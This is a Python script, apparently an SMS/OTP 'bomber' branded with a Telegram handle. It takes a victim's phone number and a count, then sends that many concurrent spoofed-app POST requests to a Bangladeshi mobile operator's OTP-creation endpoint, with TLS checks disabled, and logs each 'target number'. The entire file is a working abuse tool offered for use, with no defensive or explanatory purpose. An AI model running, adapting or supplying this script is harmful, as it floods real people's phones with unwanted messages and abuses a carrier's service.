import requests
import logging
import os
import threading
from datetime import datetime
from colorama import init, Fore, Style
import urllib3
import time  # Import the time module for sleep

# Disable urllib3 warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def display_banner():
    banner = f"""
{Fore.RED}     #     #                             #####                                           
{Fore.GREEN}     #     # ######   ##   #####  ##### #     # #####    ##   ###### ##### ###### #####  
{Fore.BLUE}     #     # #       #  #  #    #   #   #       #    #  #  #  #        #   #      #    # 
{Fore.YELLOW}     ####### #####  #    # #    #   #   #       #    # #    # #####    #   #####  #    # 
{Fore.CYAN}     #     # #      ###### #####    #   #       #####  ###### #        #   #      #####  
{Fore.MAGENTA}     #     # #      #    # #   #    #   #     # #   #  #    # #        #   #      #   #  
{Fore.WHITE}     #     # ###### #    # #    #   #    #####  #    # #    # #        #   ###### #    # 
    
                  t.me/heartcrafter
    
    """
    print(banner)

def is_valid_msisdn(msisdn):
    return msisdn.isdigit() and len(msisdn) in [10, 11, 13]

def get_headers():
    return {
        "token": "" ,
        "platform": "android",
        "appname": "robi_lite",
        "locale": "en",
        "deviceid": "e602fe23371a73a6",
        "appversion": "1000004",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "20",
        "Host": "singleapp.robi.com.bd",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.0"
    }

def send_request(full_msisdn, error_count):
    headers = get_headers()
    data = {"msisdn": full_msisdn}
    try:
        response = requests.post("https://singleapp.robi.com.bd/api/v1/tokens/create_opt", headers=headers, data=data, verify=False)
        if response.status_code == 500:
            logging.error(f"{Fore.RED}Internal Server Error for {full_msisdn}")
            error_count[0] += 1
        else:
            response.raise_for_status()
            logging.info(f"{Fore.GREEN}Request successful to {full_msisdn}")
    except requests.exceptions.RequestException as e:
        logging.error(f"{Fore.RED}Request failed: {e}")
    
    time.sleep(0.5)  # Pause for 0.5 seconds between requests

def send_requests_concurrently(full_msisdn, amount, error_count):
    threads = []
    for _ in range(amount):
        thread = threading.Thread(target=send_request, args=(full_msisdn, error_count))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def save_log(target_number, total_count, start_time, end_time, error_count):
    log_data = f"Target Number: {target_number}, Total Count: {total_count}, Start Time: {start_time}, End Time: {end_time}, Internal Server Errors: {error_count}\n"
    with open("logfile.txt", "a") as logfile:
        logfile.write(log_data)

def main():
    display_banner()
    error_count = [0]  # Use a list to allow passing by reference to threads
    
    try:
        while True:
            msisdn = input("Enter MSISDN (or type 'exit' to quit): ")
            if msisdn.lower() == 'exit':
                break

            if not is_valid_msisdn(msisdn):
                logging.error(f"{Fore.RED}Invalid MSISDN format.")
                continue

            amount = input("Enter amount: ")
            if not amount.isdigit():
                logging.error(f"{Fore.RED}Amount must be a number.")
                continue

            full_msisdn = "88" + msisdn
            amount = int(amount)

            start_time = datetime.now()
            send_requests_concurrently(full_msisdn, amount, error_count)
            end_time = datetime.now()

            save_log(full_msisdn, amount, start_time, end_time, error_count[0])

    except KeyboardInterrupt:
        end_time = datetime.now()
        save_log(full_msisdn, amount, start_time, end_time, error_count[0])
        logging.info(f"{Fore.YELLOW}\nProcess interrupted and data saved to logfile.txt")

if __name__ == "__main__":
    main()
